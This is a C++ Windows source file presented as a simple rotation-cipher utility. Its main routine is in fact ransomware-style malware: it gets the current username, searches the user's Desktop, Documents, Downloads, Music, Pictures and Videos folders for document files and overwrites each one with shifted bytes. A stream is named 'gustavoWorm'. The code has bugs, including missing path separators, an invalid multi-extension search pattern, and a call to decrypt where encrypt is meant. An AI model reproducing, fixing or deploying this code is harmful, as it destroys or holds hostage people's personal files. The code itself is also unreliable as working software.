/******************************************
general rotation cipher ecnryption
use:
keyGen()
encryption(string)
decryption(string)
*********************************************/
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <Lmcons.h>
#include <vector>
#include <windows.h>

using namespace std;

string GetUsrName () {
  char username[UNLEN+1];
  DWORD username_len = UNLEN+1;
  GetUserName(username, &username_len);
  return username;
}

int keyval() { return 1;}

string encrypt (string input, string path) {
  ofstream output;
  output.open(path);

  string result = "";

  for (int i = 0; i < input.length(); i++) {

    input[i] += keyval();
    result += input[i];
  }

  output << result;
  return result;
}

string decrypt (string input, string path) {
  ofstream output;
  output.open(path);

  string result = "";
  for(int i = 0; i <input.length(); i++) {
    input[i] -= keyval();
    result += input[i];
  }

  output << result;
  return result;
}


int main (int argc, char* argv[]) {
  ifstream in;

  string dir_list [] = {
    "C:\\Users\\" + GetUsrName() + "\\Desktop",
    "C:\\Users\\" + GetUsrName()  + "\\Documents",
    "C:\\Users\\" + GetUsrName() + "\\Downloads",
    "C:\\Users\\" + GetUsrName() + "\\Music",
    "C:\\Users\\" + GetUsrName()  + "\\Pictures",
    "C:\\Users\\" + GetUsrName() + "\\Videos",
};

for (int directoryIterator = 0; directoryIterator < sizeof(dir_list)/sizeof(*dir_list); directoryIterator++) {

string path = dir_list[directoryIterator];
string searchPattern = "*.txt *.docx *.rtf *.html *.pdf *.doc *htm";
string fullSearchPath = path + searchPattern;
WIN32_FIND_DATA FindData;
HANDLE hFind;

hFind = FindFirstFile(fullSearchPath.c_str(), &FindData);

if(hFind == INVALID_HANDLE_VALUE) {
  cout << "error searching directory \n";
  return -1;
}

do {
  string filePath = path + FindData.cFileName;
  ifstream in( filePath.c_str() );
         if( in )
         {
           stringstream gustavoWorm;
          gustavoWorm << in.rdbuf();

           string contents(gustavoWorm.str());

           cout <<gustavoWorm.str();
          /*  string r = */   decrypt(gustavoWorm.str(), filePath);
          //decrypt(r , filePath);
         }
         else
         {
             cout << "Problem opening file " << FindData.cFileName << "\n";
         }
     }
     while( FindNextFile(hFind, &FindData) > 0 );

     if( GetLastError() != ERROR_NO_MORE_FILES )
     {
         cout << "Something went wrong during searching\n";
     }
}

     system("pause");
     return 0;
 }
/*
in.open("file.txt");
stringstream buffer;
buffer << in.rdbuf();
string contents(buffer.str());
cout <<buffer.str();
cout <<   encrypt("Hello") << endl ;
cout << decrypt(encrypt("Hello"));
*/
